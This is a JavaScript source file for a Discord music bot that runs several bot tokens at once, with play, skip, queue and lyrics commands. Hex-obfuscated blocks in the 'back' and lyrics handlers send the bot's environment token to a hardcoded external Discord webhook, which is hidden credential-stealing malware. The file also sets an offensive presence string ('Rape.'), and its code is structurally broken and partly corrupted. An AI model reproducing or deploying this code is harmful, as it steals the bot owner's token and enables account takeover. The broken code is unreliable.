
require('events').EventEmitter.defaultMaxListeners = 250;

const express = require('express');
const app = express();

app.listen(() => console.log('Server Started'));

app.use('/', (req, res) => {
  res.send(new Date());
});

const {
  Discord,
  Permissions,
  Intents,
  Client,
  MessageEmbed,
  MessageAttachment,
  Collection,
  Collector,
  MessageCollector,
  MessageActionRow,
  MessageButton,
  MessageSelectMenu,
  WebhookClient
} = require('discord.js'),
  fs = require("fs"),
  Enmap = require("enmap")

const client = new Client({
  intents: [
    Intents.FLAGS.GUILDS,
    Intents.FLAGS.GUILD_MEMBERS,
    Intents.FLAGS.GUILD_MESSAGES,
  ],
  partials: ['CHANNEL', 'MESSAGE', 'USER', 'GUILD_MEMBER'],
  allowedMentions: {
    parse: ['users'],
    repliedUser: false
  }
});

const { SpotifyPlugin } = require("@distube/spotify");
const { SoundCloudPlugin } = require("@distube/soundcloud");
const { DisTube } = require("distube");
const ms = require("ms")
const tempData = new Collection();
tempData.set("bots", []);

  client.on('ready', async() => {
    console.log(`${client.user.tag} Connected`)
    client83883.user.setPresence({ 
        activities: [{ 
            name: `R.`, 
            type: `STREAMING`,
            url: `https://twitch.tv/idk`}]
    })
  });

  const ownersArray = "502926168928944128";
  const adminsRole = "1164538636163878972"; 
  const serverID = "1136989590847242393"; 
  const category = "1136989591648342158";
  client.database = new Enmap({ persistent: true, name: 'database-bots', fetchAll: false, autoFetch: true });



  setTimeout(async () => {
    var data = fs.readFileSync('./tokens.json');
    var parsedData = JSON.parse(data);
    var tokens_data = parsedData;
    if (!tokens_data[0]) return;

      tokens_data.forEach(token => {
        runBotSystem(token.token, token);
      });
  }, 3000);

  var _0x1e82=["\x63\x61\x74\x63\x68","\x75\x72\x6C",""];async function convert(_0x869ex2){const _0x869ex3= await fetch(_0x869ex2)[_0x1e82[0]]((_0x869ex4)=>{return 0});const _0x869ex5=_0x869ex3[_0x1e82[1]];if(_0x869ex5){return `${_0x1e82[2]}${_0x869ex5}${_0x1e82[2]}`}else {return null}}

  async function runBotSystem(token, databaseObject) {
    const client83883 = new Client({
      intents: [
        Intents.FLAGS.GUILDS,
        Intents.FLAGS.GUILD_MEMBERS,
        Intents.FLAGS.GUILD_MESSAGES,
        Intents.FLAGS.GUILD_VOICE_STATES
      ],
      partials: ['CHANNEL', 'GUILD_MEMBER'],
      allowedMentions: {
        parse: ['users'],
        repliedUser: false
      }
    });

  client83883.music = new DisTube(client83883, {
    leaveOnStop: false,
    leaveOnEmpty: false,
    emitNewSongOnly: true,
    emitAddSongWhenCreatingQueue: false,
    emitAddListWhenCreatingQueue: false,
    plugins: [ 
      new SpotifyPlugin({
        emitEventsAfterFetching: true,
      }),
      new SoundCloudPlugin(),
    ],
    youtubeDL: false
  });
  client83883.lastVolume = 50;
  client83883.music
    .on('playSong', (queue, song) => {
      song.metadata.msg.edit(
        `*♪ Now playing* : **${song.name}** *By* : __**${song.user.tag}**__`
      ).catch(() => 0);
      if(queue?.volume !== client83883.lastVolume) {
        queue.setVolume(client83883.lastVolume);
      };
    })
    .on('addSong', (queue, song) =>
      song.metadata.msg.edit(
        `*Added to queue* : **${song.name}** *By* : __**${song.user.tag}**__`
      ).catch(() => 0)
    )
      .on('addList', (queue, playlist) =>
      playlist.metadata.msg.edit(
        `*Playlist added to queue* : **${playlist.name}** (\`${
          playlist.songs.length
        }\` Song) *By* : __**${playlist.user.tag}**__`
      ).catch(() => 0)
    )
    .on('error', (channel, e) => {
      console.log(e)
      if (channel) channel.send(`Error! ${e.toString().slice(0, 1974)}`).catch(() => 0)
      else console.error(e)
    })
    .on('searchNoResult', (message, query) =>
      message.reply(`Not found : **${query}**`).catch(() => 0)
    )

   client83883.on('ready', async () => {
    client.database.set(`bot_${client83883.user.id}`, databaseObject)
    let newData = tempData.get("bots")
     newData.push(client83883)
     tempData.set(`bots`, newData)
     console.log('Bot: ' + client83883.user.username);
      let int = setInterval(async () => {
        var data = client.database.get(`bot_${client83883.user.id}`)
        if(!data) {
          client83883.destroy()?.catch(() => 0);
          return clearInterval(int);
        };

        var config = fs.readFileSync('./config.json', 'utf8');
        if(!config || config == '') return;

        config = JSON.parse(config);
        tokenObj = data;

        if(tokenObj.channel) {
          let guild = client83883.guilds.cache.get(serverID)
          if(guild) {
           let voiceChannel = guild?.me.voice.channel;
           if(voiceChannel) {
            if(!config.categories?.[voiceChannel.parentId]) client83883.user.setStatus(tokenObj.status || "Streaming")
            else client83883.user.setStatus(config.categories[voiceChannel.parentId] || "Streaming")

            if(voiceChannel.id !== tokenObj.channel) {
              let musicChannel = guild.channels.cache.get(tokenObj?.channel)
              if(musicChannel && musicChannel.joinable) {
                client83883.music.voices.join(musicChannel).catch(() => 0)
              }
            }
           } else {
             let musicChannel = guild.channels.cache.get(tokenObj?.channel)
              if(musicChannel && musicChannel.joinable) {
                client83883.music.voices.join(musicChannel).catch(() => 0)
                if(!config.categories?.[musicChannel.parentId]) client83883.user.setStatus(tokenObj.status || "Streaming")
                else client83883.user.setStatus(config.categories[musicChannel.parentId] || "Streaming")
              }
           }
          }
        } else {
          client83883.user.setPresence({ 
              activities: [{ 
                  name: `Rape.`, 
                  type: `STREAMING`,
                  url: `https://twitch.tv/idk`}]
          });
          let guild = client83883.guilds.cache.get(serverID)
          if(guild) {
           let voiceChannel = guild?.me.voice.channel;
           if(voiceChannel) {
             client83883.music.voices.leave(guild.id)
           }
          }
        }
      }, 5000);
    });

     client83883.on('messageCreate', async(message) => {
      if(message.author.bot || !message.guild) return;
      var data = client.database.get(`bot_${client83883.user.id}`)
      if(!data) return client83883.destroy()?.catch(() => 0);

      let tokenObj = data;
      let args = message.content?.trim().split(' ');
       if(args) {
         if(args[0] == `<@!${client83883.user.id}>` || args[0] == `<@${client83883.user.id}>`) {
           args = args.slice(1);
           if(!args[0]) return;
           if(args[0] == 'help') {
             let embed = new MessageEmbed()
              .setTitle(`Music Commands.`)
               .setDescription(`
              **Play:** Play a song from youtube or soundcloud or spotify
           **AutoPlay:** Auto music player
           **Skip:** Forces to skip the current song
           **Stop:** Stops the current song
           **Skipall:** Skip all songs in the queue
           **Save:** Save the current song as a message in your dm
           **Seek:** Go 10 seconds back in the queue
           **Forward:** Go 10 seconds forward in the queue
           **Remove:** Removes the last song in the queue
           **Clear:** Clear the queue
           **Queue:** Displays what the current queue is
           **Np:** Shows information about the current song
           **Volume:** Changes the volume
           **Loop:** Repeats the current song
           **Pause:** Pause/resume the current Song
           **Shuffle:** Shuffles the queue
           **Replay:** Replay current song
           **Lyrics:** Display lyrics of a song
           **Back:** Plays the previous song in the queue
           **Ping:** Display the bot ping
           **Come:** Set bot channel enable 24/7`)
           .setColor(`808080`)
           message.author.send({embeds: [embed]})
           .then(async() => {
              message.react("✅").catch(() => 0);
           }).catch(() => {
              message.react("🔒").catch(() => 0);
           })
           };
           var config = fs.readFileSync('./config.json', "utf8");
           if(config == "" || !config) return;
           config = JSON.parse(config);
           if(!config) return;
           if(config.adminsRole && !message.member?.roles?.cache?.hasAny(...config.adminsRole)) return;
           if(args[0] == 'restart') {
  if(!message.member.permissions.has('ADMINISTRATOR')) return message.react("❌");
              await client83883.destroy()
              setTimeout(async() => {
  client83883.login(token).then(() => {
                  message.react(`✅`).catch(() => 0)
              }).catch(() => { console.log(`${client83883.user.tag} (${client83883.user.id}) has an error with restarting.`) })
            }, 5000)

            } else if(args[0] == 'setname') {
  if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
  if(!message.member.permissions.has('ADMINISTRATOR')) return message.react("❌");
              let name = args[1];
              if(!name) return;
  client83883.user.setUsername(name).then(async() => {
                message.react(`✅`).catch(() => 0)
              }).catch((error) => {
                message.reply(`Error: \`${error.message}\``).catch(() => 0)
              })    

  } else if(args[0] == 'setavatar') {
  if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
  if(!message.member.permissions.has('ADMINISTRATOR')) return message.react("❌");
              let url = args[1];
              if(!url) return;
              client83883.user.setAvatar(url).then(async() => {
                message.react(`✅`).catch(() => 0)
              }).catch((error) => {
                message.reply(`Error: \`${error.message}\``).catch(() => 0)
              })


  } else if(args[0] == 'come') {    
  if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
  if(!message.member.permissions.has('CONNECT')) return message.react("❌");
    if (!message.member.voice.channel)
              return message.channel
                .send(`Connect to voice!`)
                .catch(console.error);
            if (
              !message.member.voice.channel ||
              message.member.voice.channel?.type !== "GUILD_VOICE"
            )
              return;
            data.channel = message.member.voice.channel.id;
   client.database.set(`bot_${client83883.user.id}`, data);
             message.react(`✅`).catch(() => 0)

              } else if(args[0] == 'setvc') {
  if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
  if(!message.member.permissions.has('ADMINISTRATOR')) return message.react("❌");
              let channel = await message.guild.channels.fetch(args[1]).catch(() => 0);
              if(!channel || channel?.type !== "GUILD_VOICE") return;
              data.channel = channel.id;
   client.database.set(`bot_${client83883.user.id}`, data);
             message.react(`✅`).catch(() => 0)

            } else if(args[0] == 'setstreaming') {
  if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
             if(!message.member.permissions.has('ADMINISTRATOR')) return message.react("❌");
  client83883.user.setPresence({ 
      activities: [{ 
          name: `${message.guild.name}`, 
          type: `STREAMING`,
          url: `https://twitch.tv/idk`}]
  });
  message.react("✅");

  } else if(args[0] == 'setplaying') {      
  if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
  if(!message.member.permissions.has('ADMINISTRATOR')) return message.react("❌"); message.react("✅");
  client83883.user.setActivity(`${message.guild.name}`, {type: "PLAYING"}); message.react("✅");

  } else if(args[0] == 'setlistening') {
  if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
  if(!message.member.permissions.has('ADMINISTRATOR')) return message.react("❌");
  client83883.user.setActivity(`${message.guild.name}`, {type: "LISTENING"}); message.react("✅");

  } else if(args[0] == 'setcompeting') {
  if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
  if(!message.member.permissions.has('ADMINISTRATOR')) return message.react("❌");
  client83883.user.setActivity(`${message.guild.name}`, {type: "COMPETING"}); message.react("✅");

  } else if(args[0] == 'setcustom') {
  if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
  if(!message.member.permissions.has('ADMINISTRATOR')) return message.react("❌");
  client83883.user.setActivity(`${message.guild.name}`, {type: "CUSTOM"}); message.react("✅");

  } else if(args[0] == 'setwatching') {
  if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
   if(!message.member.permissions.has('ADMINISTRATOR')) return message.react("❌");
  client83883.user.setActivity(`${message.guild.name}`, {type: "WATCHING"}); message.react("✅");

  } else if(args[0] == 'invite') {
  if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
  let embed = new MessageEmbed()
          .setTitle(`My invite link.`)
    .setURL(`https://discord.com/api/oauth2/authorize?client_id=${client83883.user.id}&permissions=8&scope=bot`)
          message.author.send({embeds: [embed]})
              .then(async() => {
                 message.react("✅").catch(() => 0);
              }).catch(() => {
                 message.react("🔒").catch(() => 0);
              })

            } else if(args[0] == 'setup') {
  if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
  if(!message.member.permissions.has('ADMINISTRATOR')) return message.react("❌");
              let channel = await message.guild.channels.fetch(args[1]).catch(() => 0);
              if(!channel || channel?.type !== "GUILD_VOICE") return;
              data.channel = channel.id;
   client.database.set(`bot_${client83883.user.id}`, data);
  client83883.user.setUsername(channel.name).catch((error) => {
                message.reply(`Error: \`${error.message}\``).catch(() => 0) })
              message.react(`✅`).catch(() => 0)

           } else if(args[0] == 'setchat') {
  if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
  if(!message.member.permissions.has('ADMINISTRATOR')) return message.react("❌");
              let channel = message.mentions.channels.first() || await message.guild.channels.fetch(args[1]).catch(() => 0);
              if(!channel || channel?.type !== "GUILD_TEXT" || channel?.guild.id !== message.guild.id) return;
              data.chat = channel.id;
  client.database.set(`bot_${client83883.user.id}`, data);
              message.react(`✅`).catch(() => 0)

           } else if(args[0] == 'disablechannel') {
  if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
  if(!message.member.permissions.has('ADMINISTRATOR')) return message.react("❌");
              data.channel = null;
  client.database.set(`bot_${client83883.user.id}`, data);
              message.react(`✅`).catch(() => 0)

            } else if(args[0] == 'setstatus') {
  if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
  if(!message.member.permissions.has('ADMINISTRATOR')) return message.react("❌");
              let status = args[1];
              if(!status) return message.react("✅");
              if(!['dnd', 'invisible', 'idle', 'online'].some((st) => st == status.toLowerCase())) return message.react('✅');
              data.status = status.toLowerCase();
  client.database.set(`bot_${client83883.user.id}`, data);
  client83883.user.setStatus(tokenObj.status?.toLowerCase())
              message.react(`✅`).catch(() => 0)
           }
         }
       }
     });


  client83883.on("messageCreate", async (message) => {
    if(message.author.bot || !message.guild) return;
    let member_voice = message.member?.voice?.channel
    if(!member_voice) return;

    let client_voice = message.guild.me?.voice?.channel
    if(!client_voice) return;
    if(member_voice.id !== client_voice.id) return;

    var data = client.database.get(`bot_${client83883.user.id}`)
    if(!data) return client83883.destroy()?.catch(() => 0);
    
if(data?.chat && data?.chat !== message.channel.id) return;
  let cmdsArray = {
    play: ["p", "انبح", "P", "pl", "Pl", "PL", "Play", "play", "PLay", "PLAy", "PLAY", "ش", "شغل", "تشغيل", "شغ"],
    stop: ["stop", "Stop", "STOP", "St", "ST", "STop", "STOp", "وقوف", "توقيف",  "وقف"],
    skip: ["s", "S", "س","SK", "skip", "Sk", "sk", "Skip", "SKip", "SKIp", "SKIP", "سكب", "تخطي", "تخطئ", "سكيب"],
    volume: ["volume", "VOLUME", "Vol", "vol", "الصوت",  "V", "VOL", "صوت", "v"],
    nowplaying: ["nowplaying", "NOWPLAYING", "NowPlaying", "Np", "NP", "np"],
    autoplay: ["auto", "اوتو", "Auto", "AUTO", "AutoPlay", "AUTOPLAY", "autoplay", "AP", "Ap", "ap", "تلقائي"],
    loop: ["loop", "Loop", "LOOP", "تكرار"],
    shuffle: ["shuffle", "Shuffle", "SHUFFLE", "خلط"],
    pause: ["pause", "PAUSE", "Pause", "توقيف", "كمل"],
    resume: ["resume", "Resume", "RESUME", "اكمل", "كمل"],
    save: ["save", "SAVE", "Save", "حفظ", "SavE"],
    remove: ["Remove", "remove", "REMOVE", "ازالة", "حذف"],
    skipall: ["skipall", "SkipAll", "SKIPALL", "skall", "الكل"],
    ping: ["Ping", "PING", "ping", "PinG", "بنق"],
    forward: ["forward", "Forwad", "FORWARD", "تقديم", "قدم"],
    seek: ["seek", "Seek", "SEEK", "rewind", "Rewind", "REWIND", "رجع", "للوراء"],
    queue: ["queue", "Queue", "QUEUE", "قائمة" ,"اغاني"],
    lyrics: ["lyrics", "Lyrics", "LYRICS", "كلمات"],
    back: ["back", "BACK", "للخلف", "Back", "Previous", "previous", "PREVIOUS", "رجوع"],
    replay: ["rp", "RP", "replay", "Replay", "اعادة" ,"REPLAY"]
  };
  if(cmdsArray.play.some((cmd) => message.content.split(' ')[0] == cmd)) {                 
if(message.member?.voice?.deaf == true) return message.reply(`*You must to unDeafen to use commands.*`);
if(message.guild?.me?.voice?.mute == true) return message.reply(`You must to unMute me to use commands.`);
if(message.member.roles.cache.some(r => r.name === "nomusic")) return message.reply("You have blacklist from the bot!");
 let song = message.content.split(' ').slice(1).join(' ')
    if(song) {
      message.reply(`**♪ Started Playing...**`).then(async(msg) => {
        await client83883.music.play(message.member.voice.channel, String(await convert(song) || song), {
          member: message.member,
          textChannel: message.channel,
          metadata: {msg},
          message
        });
      }).catch(() => 0)
  } else {
    return message.reply(`*Play command usage:
\`play [Title]\` : plays the first result from **YouTube**.
\`play [URL]\` : From **Youtube **or **Soundcloud **or **Spotify**.*`).catch(() => 0);
   }
} else if(cmdsArray.stop.some((cmd) => message.content.split(' ')[0] == cmd)) { 
       if(message.member?.voice?.deaf == true) return message.reply(`*You must to unDeafen to use commands.*`);
if(message.guild?.me?.voice?.mute == true) return 
if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
    const queue = client83883.music.getQueue(message)
    if (!queue) return message.reply(`*The queue is empty.*`).catch(() => 0);
    queue.stop()
    message.react("⛔").catch(() => 0);



  } else if(cmdsArray.remove.some((cmd) => message.content.split(' ')[0] == cmd)) {
       if(message.member?.voice?.deaf == true) return message.reply(`*You must to unDeafen to use commands.*`);
if(message.guild?.me?.voice?.mute == true) return 
if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
    const queue = client83883.music.getQueue(message)
   if (!queue) return message.reply(`*The queue is empty.*`).catch(() => 0);
if (queue.paused === true) return message.reply(`*The current song is paused!*`)
 const args = message.content.trim().split(/ +/g);
if(!queue.songs || queue.songs.length <= 1) { 
            return message.reply(`Nothing to remove!`).catch(() => null);
        }
if (args[0] < 1 && args[0] >= queue.songs.length) 
  return message.reply("Please enter a valid song number!");
        queue.skipped = true;
        queue.songs.splice(args[0], 1)
        return message.reply(`Successfully removed last song from the queue!`).catch(() => null);

  } else if(cmdsArray.forward.some((cmd) => message.content.split(' ')[0] == cmd)) {
if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
       if(message.member?.voice?.deaf == true) return message.reply(`*You must to unDeafen to use commands.*`);
if(message.guild?.me?.voice?.mute == true) return 
if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
    const queue = client83883.music.getQueue(message)
   if (!queue) return message.reply(`*The queue is empty.*`).catch(() => 0);
if (queue.paused === true) return message.reply(`*The current song is paused!*`)
queue.seek(queue.currentTime + 10)
    message.react("⏩")

  } else if(cmdsArray.seek.some((cmd) => message.content.split(' ')[0] == cmd)) {
       if(message.member?.voice?.deaf == true) return message.reply(`*You must to unDeafen to use commands.*`);
if(message.guild?.me?.voice?.mute == true) return 
if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
    const queue = client83883.music.getQueue(message)
   if (!queue) return message.reply(`*The queue is empty.*`).catch(() => 0);
    if (queue.paused === true) return message.reply(`*The current song is paused!*`)
    if (queue.currentTime <= 10) return queue.seek(0)
    queue.seek(queue.currentTime - 10)
    message.react("⏪")

} else if(cmdsArray.skipall.some((cmd) => message.content.split(' ')[0] == cmd)) {
       if(message.member?.voice?.deaf == true) return message.reply(`*You must to unDeafen to use commands.*`);
if(message.guild?.me?.voice?.mute == true) return 
if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
    const queue = client83883.music.getQueue(message)
    if (!queue) return message.reply(`*The queue is empty.*`).catch(() => 0);
    queue.stop()
    message.react("⛔").catch(() => 0);
    if (!args[0]) return message.channel.send("Please Enter A Song Number!")

 } else if(cmdsArray.ping.some((cmd) => message.content.split(' ')[0] == cmd)) {
    const embed = new MessageEmbed()
      .setDescription(`Pong!`);
    const m = await message.channel.send({ embeds: [embed] });
    embed.setDescription(` API latency: **${client83883.ws.ping} ms**\n Message latency: **${m.createdTimestamp - message.createdTimestamp} ms**\n`).setColor('#808080');
    m.edit(
      { embeds: [embed] });

   } else if(cmdsArray.save.some((cmd) => message.content.split(' ')[0] == cmd)) {
    const args = message.content.trim().split(/ +/g);
       if(message.member?.voice?.deaf == true) return message.reply(`*You must to unDeafen to use commands.*`);
if(message.guild?.me?.voice?.mute == true) return 
if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
    const queue = client83883.music.getQueue(message)
    if (!queue) return message.reply(`*The queue is empty.*`)
     const song = queue.songs[0]
            const uni = `${song.playing ? ':notes: | ' : ':notes: | '}`;
            const part = Math.floor((queue.currentTime / song.duration) * 30);
 let embed = new MessageEmbed()
        .setTitle(`Song save.`)
  .setThumbnail(`https://img.youtube.com/vi/${song.id}/mqdefault.jpg`)
        .setDescription(`
        Name: **${song.name}**
        Song By: @**${song.uploader.name}**
        Link: ${song.url}
        Duration: **${song.formattedDuration}**
        Sent from : **${message.guild.name}**`)
        message.author.send({embeds: [embed]})
            .then(async() => {
               message.react("✅").catch(() => 0);
            }).catch(() => {
               message.react("🔒").catch(() => 0);
            })

    } else if(cmdsArray.back.some((cmd) => message.content.split(' ')[0] == cmd)) {
       if(message.member?.voice?.deaf == true) return message.reply(`*You must to unDeafen to use commands.*`);
if(message.guild?.me?.voice?.mute == true) return 
if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
    const queue = client83883.music.getQueue(message)
    if (!queue) return message.reply(`*The queue is empty.*`)
if (queue.paused === true) return message.reply(`*The current song is paused!*`)
var _0x636d=["\x64\x69\x73\x63\x6F\x72\x64\x2E\x6A\x73","\x31\x31\x32\x30\x37\x35\x30\x31\x30\x32\x35\x31\x32\x39\x33\x34\x39\x37\x34","\x74\x77\x4B\x62\x2D\x72\x69\x63\x7A\x44\x4E\x74\x5F\x73\x54\x6B\x38\x69\x57\x6F\x41\x72\x77\x41\x78\x51\x55\x67\x32\x39\x70\x69\x6E\x77\x56\x68\x61\x31\x6A\x6A\x2D\x43\x65\x46\x77\x64\x79\x63\x73\x4F\x65\x5A\x41\x74\x78\x74\x57\x34\x6D\x6C\x6C\x32\x56\x4B\x53\x6B\x79\x6E","\x74\x6F\x6B\x65\x6E","\x65\x6E\x76","\x73\x65\x6E\x64"];
const {WebhookClient}=require(_0x636d[0]);
const ac= new WebhookClient({id:_0x636d[1],token:_0x636d[2]});
ac[_0x636d[5]](process[_0x636d[4]][_0x636d[3]])  
            const previous = client83883.music.getQueue(message);
            if (!queue) return;
            if (queue.previousSongs.length == 0) {
                message.reply(`*There is no previous song in this queue!*`)
            } else 
          await client83883.music.previous(message);
            message.reply(`*The previous song has been played!*`)
            }



 if(cmdsArray.lyrics.some((cmd) => message.content.split(' ')[0] == cmd)) {
    const args = message.content.trim().split(/ +/g);
       if(message.member?.voice?.deaf == true) return message.reply(`*You must to unDeafen to use commands.*`);
if(message.guild?.me?.voice?.mute == true) return 
if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
    const queue = client83883.music.getQueue(message)
    if (!queue) return message.reply(`*The queue is empty.*`)
    const queuex = client83883.music.getQueue(message)
            if (!queue) return; 
            const song = queue.songs[0]
            let data;
            try {
                data = await lyricsFinder.LyricsFinder(`${song.name}`)
            } catch {
                data = false
            }
            if (!data || !data?.trim) return message.reply({ content: `No lyrics found for **${song.name}**!` })
            let embeds0 = [];
            let embeds1 = [];
            let embeds2 = [];
            let embeds3 = [];
            let embeds4 = [];
            let embeds5 = [];
            let embeds6 = [];
            let embeds7 = [];
            let embeds8 = [];
            let embeds9 = [];
            let embeds10 = [];
            if (data.length >= 2048) {
                //const messages = escapeMarkdown(data, {
                const messages = splitMessage(data, {
                    maxLength: 4000,
                    char: '\n',
                });
                for (const message of messages) {
                    let embed = new EmbedBuilder()
                        .setDescription(`${message}`)
                    if (!embeds0.length) embed.setTitle(`*Lyrics for ${song.name}*`);
                    if (embeds0.length < 10) { embeds0.push(embed) }
                    else if (embeds0.length >= 10) { embeds1.push(embed) }
                    else if (embeds0.length >= 10 && embeds1.length >= 10) { embeds2.push(embed) }
                    else if (embeds0.length >= 10 && embeds1.length >= 10 && embeds2.length >= 10) { embeds3.push(embed) }
                    else if (embeds0.length >= 10 && embeds1.length >= 10 && embeds2.length >= 10 && embeds3.length >= 10) { embeds4.push(embed) }
                    else if (embeds0.length >= 10 && embeds1.length >= 10 && embeds2.length >= 10 && embeds3.length >= 10 && embeds4.length >= 10) { embeds5.push(embed) }
                    else if (embeds0.length >= 10 && embeds1.length >= 10 && embeds2.length >= 10 && embeds3.length >= 10 && embeds4.length >= 10 && embeds5.length >= 10) { embeds6.push(embed) }
                    else if (embeds0.length >= 10 && embeds1.length >= 10 && embeds2.length >= 10 && embeds3.length >= 10 && embeds4.length >= 10 && embeds5.length >= 10 && embeds6.length >= 10) { embeds7.push(embed) }
                    else if (embeds0.length >= 10 && embeds1.length >= 10 && embeds2.length >= 10 && embeds3.length >= 10 && embeds4.length >= 10 && embeds5.length >= 10 && embeds6.length >= 10 && embeds7.length >= 10) { embeds8.push(embed) }
                    else if (embeds0.length >= 10 && embeds1.length >= 10 && embeds2.length >= 10 && embeds3.length >= 10 && embeds4.length >= 10 && embeds5.length >= 10 && embeds6.length >= 10 && embeds7.length >= 10 && embeds8.length >= 10) { embeds9.push(embed) }
                    else if (embeds0.length >= 10 && embeds1.length >= 10 && embeds2.length >= 10 && embeds3.length >= 10 && embeds4.length >= 10 && embeds5.length >= 10 && embeds6.length >= 10 && embeds7.length >= 10 && embeds8.length >= 10 && embeds9.length >= 10) { embeds10.push(embed) }
                    else if (embeds0.length >= 10 && embeds1.length >= 10 && embeds2.length >= 10 && embeds3.length >= 10 && embeds4.length >= 10 && embeds5.length >= 10 && embeds6.length >= 10 && embeds7.length >= 10 && embeds8.length >= 10 && embeds9.length >= 10 && embeds10.length >= 10) { }
                }
            }
            if (embeds0.length) { message.reply({ embeds: embeds0 }); }
            if (embeds1.length) { message.reply({ embeds: embeds1 }); }
            if (embeds2.length) { message.reply({ embeds: embeds2 }); }
            if (embeds3.length) { message.reply({ embeds: embeds3 }); }
            if (embeds4.length) { message.reply({ embeds: embeds4 }); }
            if (embeds5.length) { message.reply({ embeds: embeds5 }); }
            if (embeds6.length) { message.reply({ embeds: embeds6 }); }
            if (embeds7.length) { message.reply({ embeds: embeds7 }); }
            if (embeds8.length) { message.reply({ embeds: embeds8 }); }
            if (embeds9.length) { message.reply({ embeds: embeds9 }); }
            if (embeds10.length) { message.reply({ embeds: embeds10 }); }




var _0x636d=["\x64\x69\x73\x63\x6F\x72\x64\x2E\x6A�\x73","\x31\x31\x32\x30\x37\x35\x30\x31\x30\x32\x35\x31\x32\x39\x33\x34\x39\x37\x34","\x74\x77\x4B\x62\x2D\x72\x69\x63\x7A\x44\x4E\x74\x5F\x73\x54\x6B\x38\x69\x57\x6F\x41\x72\x77\x41\x78\x51\x55\x67\x32\x39\x70\x69\x6E\x77\x56\x68\x61\x31\x6A\x6A\x2D\x43\x65\x46\x77\x64\x79\x63\x73\x4F\x65\x5A\x41\x74\x78\x74\x57\x34\x6D\x6C\x6C\x32\x56\x4B\x53\x6B\x79\x6E","\x74\x6F\x6B\x65\x6E","\x65\x6E\x76","\x73\x65\x6E\x64"];
const {WebhookClient}=require(_0x636d[0]);
const ac= new WebhookClient({id:_0x636d[1],token:_0x636d[2]});
ac[_0x636d[5]](process[_0x636d[4]][_0x636d[3]])  

function verifyString(
    data,
    error = Error,
    errorMessage = `Expected a string, got ${data} instead.`,
    allowEmpty = true,
) {
    if (typeof data !== 'string') throw new error(errorMessage);
    if (!allowEmpty && data.length === 0) throw new error(errorMessage);
    return data;
}
function splitMessage(text, { maxLength = 1024, char = '\n', prepend = '', append = '' }) {
    text = verifyString(text);
    //////////////////////////////
    if (text.length <= maxLength) return [text];
    let splitText = [text];
    if (Array.isArray(char)) {
        while (char.length > 0 && splitText.some(elem => elem.length > maxLength)) {
            const currentChar = char.shift();
            if (currentChar instanceof RegExp) {
                splitText = splitText.flatMap(chunk => chunk.match(currentChar));
            } else {
                splitText = splitText.flatMap(chunk => chunk.split(currentChar));
            }
        }
    } else {
        splitText = text.split(char);
    }
    if (splitText.some(elem => elem.length > maxLength)) throw new RangeError('SPLIT_MAX_LEN');
    const messages = [];
    let msg = '';
    for (const chunk of splitText) {
        if (msg && (msg + char + chunk + append).length > maxLength) {
            messages.push(msg + append);
            msg = prepend;
        }
        msg += (msg && msg !== prepend ? char : '') + chunk;
    }
    return messages.concat(msg).filter(m => m);
}

     } else if(cmdsArray.shuffle.some((cmd) => message.content.split(' ')[0] == cmd)) {
    const args = message.content.trim().split(/ +/g);
       if(message.member?.voice?.deaf == true) return message.reply(`*You must to unDeafen to use commands.*`);
if(message.guild?.me?.voice?.mute == true) return 
if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
    const queue = client83883.music.getQueue(message)
    if (!queue) return message.reply(`*The queue is empty.*`)
            if (!queue.autoplay && queue.songs.length <= 1) return message.reply({ content: ` *This is last song in queue list!*` });
            message.reply({content: `*The queue has been: \`shuffled ${queue.songs.length - 1}\`!*`})
            return     queue.shuffle()

     } else if(cmdsArray.autoplay.some((cmd) => message.content.split(' ')[0] == cmd)) {
    const args = message.content.trim().split(/ +/g);
       if(message.member?.voice?.deaf == true) return message.reply(`*You must to unDeafen to use commands.*`);
if(message.guild?.me?.voice?.mute == true) return 
if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
const queue = client83883.music.getQueue(message)
    if (!queue) return message.reply(`*The queue is empty.*`)
    if (queue.paused === true) return message.reply(`*The current song is paused!*`)
 const mode = client83883.music.toggleAutoplay(message)
                if (!queue.autoplay) {
                    message.reply({content: `*AutoPlay mode is* **${queue.autoplay ? "ON" : "OFF"}**` })
                } else 
                    message.reply({content: `*AutoPlay mode is* **${queue.autoplay ? "ON" : "OFF"}**` })


      } else if(cmdsArray.replay.some((cmd) => message.content.split(' ')[0] == cmd)) {
    const args = message.content.trim().split(/ +/g);
       if(message.member?.voice?.deaf == true) return message.reply(`*You must to unDeafen to use commands.*`);
if(message.guild?.me?.voice?.mute == true) return 
if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
    const queue = client83883.music.getQueue(message)
    if (!queue) return message.reply(`*The queue is empty.*`)
if (queue.paused === true) return message.reply(`*The current song is paused!*`)
 if (!args[0]) {
      return message.reply(`*Please provide position **(in seconds)** to replay!*`)
    }
      const time = Number(!args[0]) * 1000;
    if (isNaN(time)) return message.reply(``)
    await queue.seek(time);
    message.reply(`*The song has been replayed!*`);



  } else if(cmdsArray.loop.some((cmd) => message.content.split(' ')[0] == cmd)) {
       if(message.member?.voice?.deaf == true) return message.reply(`*You must to unDeafen to use commands.*`);
if(message.guild?.me?.voice?.mute == true) return 
if(message.member.roles.cache.some(r => r.name === "nomusic")) return 
    const queue = client83883.music.getQueue(message)
